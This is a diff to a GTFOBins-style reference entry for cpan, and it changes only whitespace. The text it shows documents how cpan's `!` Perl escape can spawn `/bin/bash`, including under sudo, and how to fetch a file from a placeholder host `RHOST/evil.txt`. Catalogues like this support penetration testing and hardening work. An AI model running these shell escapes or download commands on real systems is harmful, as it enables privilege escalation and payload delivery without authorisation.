@@ -1,7 +1,7 @@
 ---
 functions:
   shell:
-    - description: cpan lets you execute perl commands with `! command`  
+    - description: cpan lets you execute perl commands with `! command`
       code: |
         $ cpan
         cpan[1]> ! exec '/bin/bash'
@@ -19,10 +19,10 @@ functions:
         cpan[1]> ! cpan[1]> ! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();
 
   file-download:
-    - description: Fetch a remote file via HTTP GET request and store it in PWD. 
+    - description: Fetch a remote file via HTTP GET request and store it in PWD.
       code: |
         $ cpan
-        cpan[1]> ! use File::Fetch; my $file = (File::Fetch->new(uri => 'http://RHOST/evil.txt'))->fetch(); 
+        cpan[1]> ! use File::Fetch; my $file = (File::Fetch->new(uri => 'http://RHOST/evil.txt'))->fetch();
 
   sudo:
     - code: |
@@ -30,4 +30,3 @@ functions:
         cpan[1]> ! exec '/bin/bash'
 
 ---
-
